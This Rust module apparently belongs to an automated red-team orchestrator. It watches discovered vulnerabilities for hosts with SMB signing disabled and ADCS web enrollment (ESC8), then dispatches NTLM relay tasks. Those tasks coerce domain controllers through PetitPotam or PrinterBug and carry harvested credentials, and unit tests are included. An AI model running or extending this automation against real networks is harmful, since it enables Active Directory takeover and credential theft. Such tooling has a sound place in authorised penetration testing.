//! auto_ntlm_relay -- orchestrate NTLM relay attacks when conditions are met.
//!
//! NTLM relay requires two sides: a relay listener (ntlmrelayx) and a coercion
//! trigger (PetitPotam, PrinterBug, scheduled task bots). This module dispatches
//! relay attacks when:
//!
//!   1. SMB signing is disabled on a target (relay destination)
//!   2. An ADCS web enrollment endpoint exists (ESC8 relay target)
//!   3. We have credentials to trigger coercion or a known coercion source
//!
//! The worker agent coordinates ntlmrelayx + coercion within a single task.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dedup key prefix for relay attacks.
const DEDUP_SET: &str = DEDUP_NTLM_RELAY;

/// Monitors for NTLM relay opportunities and dispatches relay attacks.
/// Interval: 30s.
pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("ntlm_relay") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<RelayWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            // Path 1: Relay to hosts with SMB signing disabled → LDAP shadow creds / RBCD
            for vuln in state.discovered_vulnerabilities.values() {
                if vuln.vuln_type.to_lowercase() != "smb_signing_disabled" {
                    continue;
                }
                if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                    continue;
                }

                let target_ip = vuln
                    .details
                    .get("target_ip")
                    .or_else(|| vuln.details.get("ip"))
                    .and_then(|v| v.as_str())
                    .unwrap_or(&vuln.target);

                if target_ip.is_empty() {
                    continue;
                }

                let relay_key = format!("smb_relay:{target_ip}");
                if state.is_processed(DEDUP_SET, &relay_key) {
                    continue;
                }

                // Find a DC we can coerce (PetitPotam)
                let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
                    state.is_processed(DEDUP_COERCED_DCS, ip)
                });

                let cred = match state.credentials.first() {
                    Some(c) => c.clone(),
                    None => continue,
                };

                items.push(RelayWork {
                    dedup_key: relay_key,
                    relay_type: RelayType::SmbToLdap,
                    relay_target: target_ip.to_string(),
                    coercion_source,
                    listener: listener.clone(),
                    credential: cred,
                });
            }

            // Path 2: Relay to ADCS web enrollment (ESC8)
            // Look for ADCS servers with HTTP enrollment that haven't been ESC8-relayed
            for vuln in state.discovered_vulnerabilities.values() {
                let vtype = vuln.vuln_type.to_lowercase();
                if vtype != "esc8" && vtype != "adcs_web_enrollment" {
                    continue;
                }
                if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                    continue;
                }

                let ca_host = vuln
                    .details
                    .get("ca_host")
                    .or_else(|| vuln.details.get("target_ip"))
                    .and_then(|v| v.as_str())
                    .unwrap_or(&vuln.target);

                if ca_host.is_empty() {
                    continue;
                }

                let relay_key = format!("esc8_relay:{ca_host}");
                if state.is_processed(DEDUP_SET, &relay_key) {
                    continue;
                }

                let coercion_source = find_coercion_source(&state.domain_controllers, |ip| {
                    state.is_processed(DEDUP_COERCED_DCS, ip)
                });

                let cred = match state.credentials.first() {
                    Some(c) => c.clone(),
                    None => continue,
                };

                let ca_name = vuln
                    .details
                    .get("ca_name")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();

                let domain = vuln
                    .details
                    .get("domain")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();

                items.push(RelayWork {
                    dedup_key: relay_key,
                    relay_type: RelayType::Esc8 { ca_name, domain },
                    relay_target: ca_host.to_string(),
                    coercion_source,
                    listener: listener.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = match &item.relay_type {
                RelayType::SmbToLdap => json!({
                    "technique": "ntlm_relay_ldap",
                    "relay_target": item.relay_target,
                    "listener_ip": item.listener,
                    "coercion_source": item.coercion_source,
                    "credential": {
                        "username": item.credential.username,
                        "password": item.credential.password,
                        "domain": item.credential.domain,
                    },
                }),
                RelayType::Esc8 { ca_name, domain } => json!({
                    "technique": "ntlm_relay_adcs",
                    "relay_target": item.relay_target,
                    "listener_ip": item.listener,
                    "ca_name": ca_name,
                    "domain": domain,
                    "coercion_source": item.coercion_source,
                    "credential": {
                        "username": item.credential.username,
                        "password": item.credential.password,
                        "domain": item.credential.domain,
                    },
                }),
            };

            let priority = dispatcher.effective_priority("ntlm_relay");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        relay_target = %item.relay_target,
                        relay_type = %item.relay_type,
                        "NTLM relay attack dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SET, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SET, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(relay = %item.relay_target, "NTLM relay task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, relay = %item.relay_target, "Failed to dispatch NTLM relay");
                }
            }
        }
    }
}

/// Find the best coercion source (a DC IP we can PetitPotam/PrinterBug).
///
/// Takes the domain_controllers map and a closure to check dedup state,
/// keeping us decoupled from `StateInner`'s module visibility.
fn find_coercion_source(
    domain_controllers: &std::collections::HashMap<String, String>,
    is_processed: impl Fn(&str) -> bool,
) -> Option<String> {
    // Prefer a DC we haven't already coerced
    domain_controllers
        .values()
        .find(|ip| !is_processed(ip))
        .or_else(|| domain_controllers.values().next())
        .cloned()
}

struct RelayWork {
    dedup_key: String,
    relay_type: RelayType,
    relay_target: String,
    coercion_source: Option<String>,
    listener: String,
    credential: ares_core::models::Credential,
}

enum RelayType {
    SmbToLdap,
    Esc8 { ca_name: String, domain: String },
}

impl std::fmt::Display for RelayType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SmbToLdap => write!(f, "smb_to_ldap"),
            Self::Esc8 { .. } => write!(f, "esc8_adcs"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn relay_type_display() {
        assert_eq!(RelayType::SmbToLdap.to_string(), "smb_to_ldap");
        assert_eq!(
            RelayType::Esc8 {
                ca_name: "CA".into(),
                domain: "contoso.local".into()
            }
            .to_string(),
            "esc8_adcs"
        );
    }

    #[test]
    fn dedup_key_format_smb() {
        let key = format!("smb_relay:{}", "192.168.58.22");
        assert_eq!(key, "smb_relay:192.168.58.22");
    }

    #[test]
    fn dedup_key_format_esc8() {
        let key = format!("esc8_relay:{}", "192.168.58.10");
        assert_eq!(key, "esc8_relay:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_SET, "ntlm_relay");
    }

    #[test]
    fn find_coercion_source_prefers_unprocessed() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());

        // First DC already processed, second not
        let result = find_coercion_source(&dcs, |ip| ip == "192.168.58.10");
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.20");
    }

    #[test]
    fn find_coercion_source_falls_back_to_any() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());

        // All processed, still returns one
        let result = find_coercion_source(&dcs, |_| true);
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.10");
    }

    #[test]
    fn find_coercion_source_empty_map() {
        let dcs = HashMap::new();
        let result = find_coercion_source(&dcs, |_| false);
        assert!(result.is_none());
    }

    #[test]
    fn esc8_vuln_type_matching() {
        let types = ["esc8", "adcs_web_enrollment", "ESC8", "ADCS_WEB_ENROLLMENT"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype == "esc8" || vtype == "adcs_web_enrollment",
                "{t} should match"
            );
        }
    }

    #[test]
    fn smb_signing_vuln_type_matching() {
        let vtype = "smb_signing_disabled".to_lowercase();
        assert_eq!(vtype, "smb_signing_disabled");

        let not_smb = "mssql_access".to_lowercase();
        assert_ne!(not_smb, "smb_signing_disabled");
    }
}
